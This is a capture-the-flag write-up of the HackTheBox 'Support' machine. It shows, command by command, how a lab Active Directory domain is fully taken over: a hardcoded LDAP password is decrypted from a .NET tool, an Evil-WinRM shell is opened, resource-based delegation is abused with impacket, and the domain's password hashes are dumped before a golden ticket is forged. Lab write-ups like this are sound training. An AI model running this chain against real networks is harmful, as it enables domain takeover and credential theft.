---
render_with_liquid: false
title: HackTheBox Writeup  Support
date: 2023-09-27 10:46:19 +1400
tags: [hackthebox, nmap, windows, crackmapexec, smbclient, reversing, detect-it-easy, decompilation, dnspy, dotnet-framework, csharp, enum, ldap, ldapdomaindump, bloodhound, discover-secrets, jq, evil-winrm, ad-maq, impacket, dacl-abuse, ad-delegation, ad-s4u, dcsync, golden-ticket, oscp-like-2023, powershell-csharp, cyberchef, ldap-passback, honeypots, wireshark, nirsoft, responder, ldeep, coerce-authentication]
---




# Recon
---

```bash
┌──(bravosec㉿fsociety)-[~/htb/Support]
└─$ writehosts htb '10.129.227.255 support.htb DC DC.support.htb'
+---------+--------+----------------+----------------+
| PROFILE | STATUS |       IP       |     DOMAIN     |
+---------+--------+----------------+----------------+
| htb     | on     | 10.129.227.255 | support.htb    |
| htb     | on     | 10.129.227.255 | DC             |
| htb     | on     | 10.129.227.255 | DC.support.htb |
+---------+--------+----------------+----------------+
```

## SMB

```bash
┌──(bravosec㉿fsociety)-[~/htb/Support]
└─$ cme smb support.htb -u '' -p '' --shares
SMB         10.129.227.255  445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
SMB         10.129.227.255  445    DC               [+] support.htb\:
SMB         10.129.227.255  445    DC               [-] Error enumerating shares: STATUS_ACCESS_DENIED
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Support]
└─$ cme smb support.htb -u 'a' -p '' --shares
SMB         10.129.227.255  445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
SMB         10.129.227.255  445    DC               [+] support.htb\a:
SMB         10.129.227.255  445    DC               [*] Enumerated shares
SMB         10.129.227.255  445    DC               Share           Permissions     Remark
SMB         10.129.227.255  445    DC               -----           -----------     ------
SMB         10.129.227.255  445    DC               ADMIN$                          Remote Admin
SMB         10.129.227.255  445    DC               C$                              Default share
SMB         10.129.227.255  445    DC               IPC$            READ            Remote IPC
SMB         10.129.227.255  445    DC               NETLOGON                        Logon server share
SMB         10.129.227.255  445    DC               support-tools   READ            support staff tools
SMB         10.129.227.255  445    DC               SYSVOL                          Logon server share
```

## Nmap

```bash

# Nmap 7.94 scan initiated Wed Sep 27 10:46:18 2023 as: nmap -sVC -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 53,88,135,139,389,445,464,636,3268,3269,5985,9389,49664,49668,49676,49681,49705,54887 support.htb
Nmap scan report for support.htb (10.129.227.255)
Host is up, received user-set (0.16s latency).
Scanned at 2023-09-27 10:46:19 CST for 102s

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2023-09-27 02:46:17Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49676/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49681/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49705/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
54887/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 4325/tcp): CLEAN (Timeout)
|   Check 2 (port 57439/tcp): CLEAN (Timeout)
|   Check 3 (port 14621/udp): CLEAN (Timeout)
|   Check 4 (port 63779/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: -9s
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2023-09-27T02:47:10
|_  start_date: N/A

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Wed Sep 27 10:48:01 2023 -- 1 IP address (1 host up) scanned in 102.40 seconds
```


# User Flag
---

## Enumeration


### SMB

```bash
┌──(bravosec㉿fsociety)-[~/htb/Support]
└─$ mkdir -p loot/smb

┌──(bravosec㉿fsociety)-[~/htb/Support]
└─$ cd loot/smb

┌──(bravosec㉿fsociety)-[~/htb/Support/loot/smb]
└─$ smbclient //support.htb/support-tools -U "a%"
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Jul 21 01:01:06 2022
  ..                                  D        0  Sat May 28 19:18:25 2022
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 19:19:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 19:19:55 2022
  putty.exe                           A  1273576  Sat May 28 19:20:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 19:19:31 2022
  UserInfo.exe.zip                    A   277499  Thu Jul 21 01:01:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 19:20:17 2022
  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 19:19:43 2022

                4026367 blocks of size 4096. 969546 blocks available
```

`Useinfo.exe.zip` stands out, since others are just common sysadmin tools

```bash
smb: \> get UserInfo.exe.zip
getting file \UserInfo.exe.zip of size 277499 as UserInfo.exe.zip (276.5 KiloBytes/sec) (average 276.5 KiloBytes/sec)
```


### Userinfo.exe

```bash
┌──(bravosec㉿fsociety)-[~/htb/Support/loot/smb]
└─$ file UserInfo.exe.zip
UserInfo.exe.zip: Zip archive data, at least v2.0 to extract, compression method=deflate

┌──(bravosec㉿fsociety)-[~/htb/Support/loot/smb]
└─$ unzip -l UserInfo.exe.zip
Archive:  UserInfo.exe.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
    12288  2022-05-28 01:51   UserInfo.exe
    99840  2022-03-02 02:18   CommandLineParser.dll
    22144  2021-10-23 07:42   Microsoft.Bcl.AsyncInterfaces.dll
    47216  2021-10-23 07:48   Microsoft.Extensions.DependencyInjection.Abstractions.dll
    84608  2021-10-23 07:48   Microsoft.Extensions.DependencyInjection.dll
    64112  2021-10-23 07:51   Microsoft.Extensions.Logging.Abstractions.dll
    20856  2020-02-19 18:05   System.Buffers.dll
   141184  2020-02-19 18:05   System.Memory.dll
   115856  2018-05-15 21:29   System.Numerics.Vectors.dll
    18024  2021-10-23 07:40   System.Runtime.CompilerServices.Unsafe.dll
    25984  2020-02-19 18:05   System.Threading.Tasks.Extensions.dll
      563  2022-05-28 00:59   UserInfo.exe.config
---------                     -------
   652675                     12 files
   
┌──(bravosec㉿fsociety)-[~/htb/Support/loot/smb]
└─$ unzip UserInfo.exe.zip
```

Get some insights on the executable file

```bash
┌──(bravosec㉿fsociety)-[~/htb/Support/loot/smb]
└─$ file UserInfo.exe
UserInfo.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections

┌──(bravosec㉿fsociety)-[~/htb/Support/loot/smb]
└─$ diec UserInfo.exe
PE32
    Library: .NET(v4.0.30319)[-]
    Linker: Microsoft Linker(48.0)[Console32,console]

┌──(bravosec㉿fsociety)-[~/htb/Support/loot/smb]
└─$ strings UserInfo.exe
```

Seems like our dude `0xdf` made this box

![](/assets/obsidian/c08541ad8e0643e8e67a10bf7244917b.png)


## Shell as support

### Recover ldap password from Userinfo.exe

Since it's .NET application, I'll use the latest maintained fork of [DNSpy](https://github.com/dnSpyEx/dnSpy)

![](/assets/obsidian/da45b79cbd2d26c356045bae375adbb1.png)

![](/assets/obsidian/d748bd660b74cb6f9f7c176edba68067.png)

Found a function to get password and connect to LDAP server

![](/assets/obsidian/27e87c4e1d81b3a11b2e6c7c7b52b3b8.png)

Now I have 4 ways to recover the LDAP password :

1. Reimplement the `getPassword()` in a csharp program to print it
2. Rewrite the `getPassword()` function in other programming languages such as **python**
3. Run the program in a windows VM, and use wireshark to capture the password, since it transfer as plaintext due to not using LDAPS
4. Use **Cyberchef**

I decided to utilize copilot to rewrite it in python since it's the fastest way for me

Wrote prompts in the docstring for **Copilot** to auto generate the code for me, then adjust a bit

> solve.py

```python
"""
Convert the Csharp code to python
---

using System;
using System.Text;

namespace UserInfo.Services
{
	// Token: 0x02000006 RID: 6
	internal class Protected
	{
		// Token: 0x0600000F RID: 15 RVA: 0x00002118 File Offset: 0x00000318
		public static string getPassword()
		{
			byte[] array = Convert.FromBase64String(Protected.enc_password);
			byte[] array2 = array;
			for (int i = 0; i < array.Length; i++)
			{
				array2[i] = array[i] ^ Protected.key[i % Protected.key.Length] ^ 223;
			}
			return Encoding.Default.GetString(array2);
		}

		// Token: 0x04000005 RID: 5
		private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";

		// Token: 0x04000006 RID: 6
		private static byte[] key = Encoding.ASCII.GetBytes("armando");
	}
}
"""
import base64

def get_password():
    enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
    key = "armando"
    array = base64.b64decode(enc_password)
    array2 = bytearray(array)
    for i in range(len(array)):
        array2[i] = array[i] ^ ord(key[i % len(key)]) ^ 223
    return array2.decode()

if __name__ == "__main__":
    print(get_password())
```

```bash
C:\Users\XXX\Desktop>python solve.py
nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```


### Validate the credentials

Below is the line that connects to LDAP, the user is `support\\ldap`

```csharp
this.entry = new DirectoryEntry("LDAP://support.htb", "support\\ldap", password);
```

Validate the user and password

> **Crackmapexec** will auto set the domain name for us, no need to specify

```bash
┌──(bravosec㉿fsociety)-[~/htb/Support]
└─$ cme ldap support.htb -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
SMB         10.129.227.255  445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
LDAP        10.129.227.255  389    DC               [+] support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Support]
└─$ cme smb support.htb -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' --shares
SMB         10.129.227.255  445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
SMB         10.129.227.255  445    DC               [+] support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
SMB         10.129.227.255  445    DC               [*] Enumerated shares
SMB         10.129.227.255  445    DC               Share           Permissions     Remark
SMB         10.129.227.255  445    DC               -----           -----------     ------
SMB         10.129.227.255  445    DC               ADMIN$                          Remote Admin
SMB         10.129.227.255  445    DC               C$                              Default share
SMB         10.129.227.255  445    DC               IPC$            READ            Remote IPC
SMB         10.129.227.255  445    DC               NETLOGON        READ            Logon server share
SMB         10.129.227.255  445    DC               support-tools   READ            support staff tools
SMB         10.129.227.255  445    DC               SYSVOL          READ            Logon server share
```


### Bloodhound


> **Bloodhound TIPs**
> 1. Mark pwned users as **Owned** first
> 2. Check some **shortest paths** to get insight
> 3. Check **none-default** groups and users
> 4. Mark **high value** for none-default user and groups that have useful perms such as `GenericALL`, `CanPSRemote`
> 5. Shortest Path -> Find shortest Path to **High Value**
> 6. Click on each suspicious users and groups
{: .prompt-tip }


```bash
┌──(bravosec㉿fsociety)-[~/htb/Support]
└─$ sudo neo4j start
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Support]
└─$ cme ldap support.htb -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' --bloodhound -c All -ns 10.129.227.255
SMB         10.129.227.255  445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
LDAP        10.129.227.255  389    DC               [+] support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
LDAP        10.129.227.255  389    DC               Resolved collection methods: session, dcom, rdp, trusts, acl, localadmin, container, objectprops, psremote, group
LDAP        10.129.227.255  389    DC               Done in 00M 25S
LDAP        10.129.227.255  389    DC               Compressing output into /home/kali/.cme/logs/DC_10.129.227.255_2023-09-27_123856bloodhound.zip
```

- There are no `asreproastable` and `kerberoastable` accounts

![](/assets/obsidian/9cc7c1845cda121868099268f9afa032.png)


### Discover hidden password via ldapdomaindump

Get a more readable information in HTML

```bash
┌──(bravosec㉿fsociety)-[~/htb/Support]
└─$ ldapdomaindump -o ldap_dump -r support.htb -u support.htb\\ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Support]
└─$ cd ldap_dump

┌──(bravosec㉿fsociety)-[~/htb/Support/ldap_dump]
└─$ ls
domain_computers_by_os.html  domain_computers.html  domain_groups.grep  domain_groups.json  domain_policy.html  domain_trusts.grep  domain_trusts.json          domain_users.grep  domain_users.json
domain_computers.grep        domain_computers.json  domain_groups.html  domain_policy.grep  domain_policy.json  domain_trusts.html  domain_users_by_group.html  domain_users.html

┌──(bravosec㉿fsociety)-[~/htb/Support/ldap_dump]
└─$ python -m http.server 81 -b 127.0.0.1
```

Notable dns hostnames : `Management.support.htb`, `dc.support.htb`

![](/assets/obsidian/a747bdf0d609051d8ff0b7edf36206fd.png)

It doesn't block brute force attacks, and allows weak passwords (Min Length < 8)

![](/assets/obsidian/0a108cb65fd82ed90a798275596f3874.png)

The user `support` is interesting, it's in `Remote Management Users` group

![](/assets/obsidian/bb0874cec8fc3144a933dcdb1f37e77c.png)

Another interesting non-default group (SID after `1000`) is `Shared Support Accounts`

![](/assets/obsidian/44b64db224402bed3ae593a70e3fe983.png)

Get the full entity info of the user `Support`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Support/ldap_dump]
└─$ cat domain_users.json|jq '.[].attributes | select(.sAMAccountName[]=="support")'
```

> Can also do `cat domain_users.json | grep -in "CN=support" -E5`
{: .prompt-tip }

Found abnormal string : `Ironside47pleasure40Watchful` in the `info` key

![](/assets/obsidian/2821cc2a6aeee2a519ec9de7891c4e28.png)

Validate the credential

```bash
┌──(bravosec㉿fsociety)-[~/htb/Support/ldap_dump]
└─$ cme winrm support.htb -u 'support' -p 'Ironside47pleasure40Watchful'
SMB         10.129.227.255  5985   DC               [*] Windows 10.0 Build 20348 (name:DC) (domain:support.htb)
HTTP        10.129.227.255  5985   DC               [*] http://10.129.227.255:5985/wsman
HTTP        10.129.227.255  5985   DC               [+] support.htb\support:Ironside47pleasure40Watchful (Pwn3d!)
```


### Evil Winrm

```bash
┌──(bravosec㉿fsociety)-[~/htb/Support]
└─$ evil-winrm -i DC.SUPPORT.HTB -u 'support' -p 'Ironside47pleasure40Watchful'
```

```bash
*Evil-WinRM* PS C:\Users\support\Documents> whoami
support\support

*Evil-WinRM* PS C:\Users\support\Documents> cat ../Desktop/user.txt
6911392db0baa5c5c206a74fc58d7b9f
```


# Root Flag
---

## Enumeration

```ruby
*Evil-WinRM* PS C:\Users\support\Documents> whoami /all

USER INFORMATION
----------------

User Name       SID
=============== =============================================
support\support S-1-5-21-1677581083-3380853377-188903654-1105


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes
========================================== ================ ============================================= ==================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
SUPPORT\Shared Support Accounts            Group            S-1-5-21-1677581083-3380853377-188903654-1103 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

Since I have `SeMachineAccountPrivilege` privilege, I can add fake computers, let's see what I can do with that

The machine account quota settings wasn't patched

```bash
┌──(bravosec㉿fsociety)-[~/htb/Support/loot/smb]
└─$ cme ldap support.htb -u support -p 'Ironside47pleasure40Watchful' -M maq
SMB         10.129.227.255  445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
LDAP        10.129.227.255  389    DC               [+] support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
MAQ         10.129.227.255  389    DC               [*] Getting the MachineAccountQuota
MAQ         10.129.227.255  389    DC               MachineAccountQuota: 10
```

> **MachineAccountQuota**
> > MachineAccountQuota (MAQ) is a domain level attribute that by default permits unprivileged users to attach up to 10 computers to an Active Directory (AD) domain
{: .prompt-tip }

Look for dangerous permissions such as `GenericALL`, `GenericWrite`, `WriteDACL` ... etc

> Refer - https://www.thehacker.recipes/a-d/movement/dacl#permisssions-index
{: .prompt-tip }

Our group : `Shared Support Account` have `GenericALL` perms to the domain

![](/assets/obsidian/5f607f5949a7b87fa05815f9ecde7ec4.png)


## Shell as Domain Admin

### Abuse DACL - GenericALL

![](/assets/obsidian/268b6abd1e0dbd9585175b5d51c480bb.png)

Add a fake computer controlled by me

```bash
┌──(bravosec㉿fsociety)-[~/htb/Support]
└─$ addcomputer.py -computer-name 'Test' -computer-pass Bravosec2023 -dc-host DC -domain-netbios support.htb support.htb/support:'Ironside47pleasure40Watchful'
Impacket v0.12.0.dev1+20230921.20754.9c8f344 - Copyright 2023 Fortra

[*] Successfully added machine account Test$ with password Bravosec2023.
```

Pick the computer `DC` to delegate to, since it have the `Trusted For Delegation` flag set

|CN|SAM Name|DNS Hostname|IPv4 Address|Operating System|Service Pack|OS Version|lastLogon|Flags|Created on|SID|description|
|---|---|---|---|---|---|---|---|---|---|---|---|
|MANAGEMENT|MANAGEMENT$|Management.support.htb|error.NXDOMAIN|Windows 10 Pro||10.0 (19042)|07/26/22 14:41:55|WORKSTATION_ACCOUNT|07/21/22 13:19:20|2601||
|DC|DC$|dc.support.htb|error.NXDOMAIN|Windows Server 2022 Standard||10.0 (20348)|09/27/23 10:11:13|SERVER_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION|05/28/22 11:03:43|1000||

> **Explaination**
> Machine accounts can edit their own msDS-AllowedToActOnBehalfOfOtherIdentity attribute, hence allowing RBCD attacks on relayed machine accounts authentications. ([Refer](https://www.thehacker.recipes/a-d/movement/kerberos/delegations/rbcd))
{: .prompt-tip }

```bash
┌──(bravosec㉿fsociety)-[~/htb/Support]
└─$ rbcd.py -delegate-from 'Test$' -delegate-to 'DC$' -action 'write' 'support.htb/support:Ironside47pleasure40Watchful'
Impacket v0.12.0.dev1+20230921.20754.9c8f344 - Copyright 2023 Fortra

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] Test$ can now impersonate users on DC$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     Test$        (S-1-5-21-1677581083-3380853377-188903654-5601)
```

Sync time before getting tickets

```bash
┌──(bravosec㉿fsociety)-[~/htb/Support]
└─$ sudo ntpdate support.htb
2023-09-27 22:21:54.299510 (+0800) -7.559281 +/- 0.053444 support.htb 10.129.227.255 s1 no-leap
CLOCK: time stepped by -7.559281
```

Get service ticket to impersonate as Domain Admin

```bash
┌──(bravosec㉿fsociety)-[~/htb/Support]
└─$ getST.py -spn 'cifs/dc.support.htb' -impersonate 'Administrator' 'support.htb/Test$:Bravosec2023'
Impacket v0.12.0.dev1+20230921.20754.9c8f344 - Copyright 2023 Fortra

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[*] Saving ticket in Administrator.ccache
```

Configure kerberos for **evil-winrm**

```bash
┌──(bravosec㉿fsociety)-[~/htb/Support]
└─$ python ~/scripts/ad/configure_krb5.py support.htb DC
[*] This script must be run as root
[*] Configuration Data:
[libdefault]
        default_realm = SUPPORT.HTB

[realms]
        SUPPORT.HTB = {
                kdc = dc.support.htb
                admin_server = dc.support.htb
        }

[domain_realm]
        support.htb = SUPPORT.HTB
        .support.htb = SUPPORT.HTB


[!] Above Configuration will overwrite /etc/krb5.conf, are you sure? [y/N] y
[+] /etc/krb5.conf has been configured
```

For some reasons, it didn't work for winrm

```ruby
┌──(bravosec㉿fsociety)-[~/htb/Support]
└─$ export KRB5CCNAME=Administrator.ccache

┌──(bravosec㉿fsociety)-[~/htb/Support]
└─$ evil-winrm -r support.htb -i dc.support.htb

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

Error: An error of type GSSAPI::GssApiError happened, message is gss_init_sec_context did not return GSS_S_COMPLETE: Unspecified GSS failure.  Minor code may provide more information
Matching credential not found (filename: Administrator.ccache)


Error: Exiting with code 1
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Support]
└─$ cme winrm --use-kcache support.htb
SMB         10.129.227.255  5985   DC               [*] Windows 10.0 Build 20348 (name:DC) (domain:support.htb)
HTTP        10.129.227.255  5985   DC               [*] http://10.129.227.255:5985/wsman
```


### Fix the ticket authentication issue via golden ticket

Dcsync first with the service ticket via kerberos authentication

```bash
┌──(bravosec㉿fsociety)-[~/htb/Support]
└─$ secretsdump.py -k dc.support.htb -outputfile secretsdump
Impacket v0.12.0.dev1+20230921.20754.9c8f344 - Copyright 2023 Fortra

[*] Target system bootKey: 0xf678b2597ade18d88784ee424ddc0d1a
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:bb06cbc02b39abeddd1335bc30b19e26:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
...
```

Craft golden ticket via my sweat **golden ticket one liner**

```bash
export DOMAIN="$(pt get domain)";export AESKEY=$(cat secretsdump.ntds.kerberos|grep krbtgt|head -n1|cut -d":" -f3); export DOMAINSID=$(lookupsid.py $domain/'Administrator'@$DOMAIN 1 -hashes '0:'$(cat secretsdump.ntds|grep Administrator|cut -d ":" -f 4)|tail -n1|cut -d ":" -f 2| xargs); ticketer.py -aesKey $AESKEY -domain-sid $DOMAINSID -domain $DOMAIN Administrator
```

^f4e2dd

Now it works!

```ruby
┌──(bravosec㉿fsociety)-[~/htb/Support]
└─$ evil-winrm -r support.htb -i dc.support.htb

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
support.htb\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> cat ../Desktop/root.txt
6cbfa6f8c17ef76560acf4e5c355fe6a
```


# Additional
---

## Oneliner to check juicy info from ldap

Use **ldeep** to dump LDAP data

```bash
mkdir -p ldeep && ldeep ldap -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -d $(pt get rhost) -s ldap://$(pt get rhost) all ldeep/
```

Filter out uninteresting data, makes  `ServicePrincipalName` (Kerberoasting),  custom fields, and users that have logged on more obvious

```bash
cat ldeep/*_users_all.json | jq 'map(del(.accountExpires,.badPasswordTime,.badPwdCount,.c,.cn,.codePage,.company,.countryCode,.dSCorePropagationData,.distinguishedName,.dn,.givenName,.instanceType,.l,.lastLogoff,.lastLogon,.logonCount,.mail,.name,.objectCategory,.objectClass,.objectGUID,.objectSid,.postalCode,.primaryGroupID,.pwdLastSet,.sAMAccountType,.sn,.st,.streetAddress,.uSNChanged,.uSNCreated,.userAccountControl,.whenChanged,.whenCreated,.memberOf,.logonHours,.isCriticalSystemObject,.adminCount,.showInAdvancedViewOnly))'
```

![](/assets/obsidian/a019300f4897c4d8a059a3787c2d263f.png)

## Other Ways to recover password from Userinfo.exe


### Cyberchef

![](/assets/obsidian/1cfa5277471c8cc646134509c64982f3.png)


### Via csharp and powershell

Since `getpassword()` function was written in Csharp, I wanna learn how to quickly replicate and modify it to decrypt password

> `solve.cs`

```csharp
using System;
using System.Text;

namespace MyApp
{
    public class Program
    {
        public static void Main()
        {
            // Call the getPassword() method from Protected class
            string password = Protected.getPassword();
            Console.WriteLine("Decrypted password: " + password);
        }
    }

    internal class Protected
    {
        private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";
        private static byte[] key = Encoding.ASCII.GetBytes("armando");

        public static string getPassword()
        {
            byte[] array = Convert.FromBase64String(enc_password);
            byte[] array2 = array;
            for (int i = 0; i < array.Length; i++)
            {
                array2[i] = (byte)(array[i] ^ key[i % key.Length] ^ 223);
            }
            return Encoding.Default.GetString(array2);
        }
    }
}
```

> - It will show **type error** If not converting `array2[i]` to byte by adding `(byte)` to `array[i] ^ key[i % key.Length] ^ 223` , due to `Dot Net framework ` version difference
> - Make sure to set `Program` class and `Main()` entry point function public
{: .prompt-tip }

Load and run via **powershell**

```powershell
PS C:\Users\GOD\Desktop> (Add-Type -Path "userinfo.cs" -PassThru); [Myapp.Program]::Main()

IsPublic IsSerial Name                                     BaseType
-------- -------- ----                                     --------
True     False    Program                                  System.Object
False    False    Protected                                System.Object
Decrypted password: nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```


### Dynamic analyze


#### Windows (Failed)

> Used **[commando-vm](https://github.com/mandiant/commando-vm)**

Upload `UserInfo.exe.zip` to windows VN

```powershell
PS Z:\tmp\UserInfo.exe> .\UserInfo.exe

Usage: UserInfo.exe [options] [commands]

Options:
  -v|--verbose        Verbose output

Commands:
  find                Find a user
  user                Get information about a user

PS Z:\tmp\UserInfo.exe> .\UserInfo.exe user -username god
[-] Exception: The server is not operational.
```

It cannot query the ip of `support.htb`, I will point it to my kali's IP in VirtualBox NAT Network

![](/assets/obsidian/b618542a047066c0e68213c1621ce0d2.png)

![](/assets/obsidian/6dc5181d1f532fb0e290d7005ab8a0b9.png)

Setup my honeypot

```bash
┌──(bravosec㉿fsociety)-[~/htb/Support]
└─$ cd /opt/sectools/misc/honeypots

┌──(bravosec㉿fsociety)-[/opt/sectools/misc/honeypots]
└─$ pipenv shell

┌──(honeypots-Cc4njmtQ)─(bravosec㉿fsociety)-[/opt/sectools/misc/honeypots]
└─$ honeypots --setup ldap
[!] For updates, check https://github.com/qeeqbox/honeypots
[!] Using system or well-known ports requires higher privileges (E.g. sudo -E)
[x] Use [Enter] to exit or python3 -m honeypots --kill
[x] Parsing honeypot [normal]
{"action": "process", "dest_ip": "0.0.0.0", "dest_port": "389", "password": "test", "server": "ldap_server", "src_ip": "0.0.0.0", "src_port": "389", "status": "success", "timestamp": "2023-09-27T15:17:06.089853", "username": "test"}
[x] QLDAPServer running..
[x] Everything looks good!
```

Start **wireshark** then start the program again

![](/assets/obsidian/5d2fd98a613ba9069dfb9ea93b524a50.png)

There was connection created but no passwords captured

![](/assets/obsidian/74c072d5ae7de23ce606630b1ae2c926.png)

Didn't found any clear text password from **wireshark** either

![](/assets/obsidian/524818574c591ffe58a4d3578e278684.png)

Even tried responder but still nothing

```bash
┌──(bravosec㉿fsociety)-[~/htb/Support]
└─$ sudo responder -A -I tun0 -v
```

Error :

![](/assets/obsidian/94bde7bfda534bae073713bb4c7291d9.png)

I tried another **ldap passback attack**, this time it shows another error

```bash
┌──(bravosec㉿fsociety)-[/opt/sectools/ad/ldap-passback-docker]
└─$ sudo docker run --rm -ti -p 389:389 ldap-passback
Starting OpenLDAP: slapd.
```

![](/assets/obsidian/e5d22b3000c718f0c7eeae99b5a27733.png)

